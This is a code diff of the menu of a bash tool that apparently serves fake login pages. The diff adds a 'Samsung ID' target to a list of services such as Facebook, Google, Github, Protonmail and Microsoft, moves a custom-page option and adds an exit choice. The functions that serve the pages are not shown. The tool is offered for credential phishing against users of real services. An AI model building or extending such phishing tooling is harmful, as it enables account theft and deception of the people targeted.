@@ -15,9 +15,9 @@ Main() {
     printf "          ${RED}[04]${CYAN} Twitter\e[0m        ${RED}[20]${CYAN} Messenger   \e[0m   ${RED}[36]${CYAN} Spotify\e[0m          \n"                
     printf "          ${RED}[05]${CYAN} Github\e[0m         ${RED}[21]${CYAN} GitLab   \e[0m      ${RED}[37]${CYAN} Netflix\e[0m          \n"                
     printf "          ${RED}[06]${CYAN} Google\e[0m         ${RED}[22]${CYAN} Twitch   \e[0m      ${RED}[38]${CYAN} Stackoverflow\e[0m         \n"
-    printf "          ${RED}[07]${CYAN} Origin\e[0m         ${RED}[23]${CYAN} MySpace    \e[0m    ${RED}[39]${CYAN} Custom\e[0m          \n"
-    printf "          ${RED}[08]${CYAN} Yahoo\e[0m          ${RED}[24]${CYAN} Badoo   \e[0m                \n"        
-    printf "          ${RED}[09]${CYAN} Linkedin\e[0m       ${RED}[25]${CYAN} VK   \e[0m                   \n"         
+    printf "          ${RED}[07]${CYAN} Origin\e[0m         ${RED}[23]${CYAN} MySpace    \e[0m    ${RED}[39]${CYAN} Samsung ID\e[0m          \n"
+    printf "          ${RED}[08]${CYAN} Yahoo\e[0m          ${RED}[24]${CYAN} Badoo   \e[0m       ${RED}[40]${CYAN} Custom Page\e[0m         \n"        
+    printf "          ${RED}[09]${CYAN} Linkedin\e[0m       ${RED}[25]${CYAN} VK   \e[0m          ${RED}[99]${CYAN} Exit BlackMan\e[0m         \n"         
     printf "          ${RED}[10]${CYAN} Protonmail\e[0m     ${RED}[26]${CYAN} Yandex   \e[0m               \n"
     printf "          ${RED}[11]${CYAN} Wordpress\e[0m      ${RED}[27]${CYAN} devianART   \e[0m            \n"
     printf "          ${RED}[12]${CYAN} Microsoft\e[0m      ${RED}[28]${CYAN} Wi-Fi   \e[0m                \n"
@@ -35,15 +35,19 @@ Main() {
     elif [[ $option == 2 ]]; then
     website="facebook"
     start
+    
     elif [[ $option == 3 ]]; then
     website="snapchat"  
     start
+    
     elif [[ $option == 4 ]]; then
     website="twitter"
     start
+    
     elif [[ $option == 5 ]]; then
     website="github"
     start
+    
     elif [[ $option == 6 ]]; then
     website="google"
     start
@@ -177,10 +181,18 @@ Main() {
     start
     
     elif [[ $option == 39 ]]; then
+    website="samsung"
+    start
+    
+    elif [[ $option == 40 ]]; then
     website="custom"
     createpage
     start
-
+    
+    elif [[ $option == 99 ]]; then
+    sleep 1
+    exit
+    
     else 
     printf "${RED}Invaild Oprion"
     sleep 1
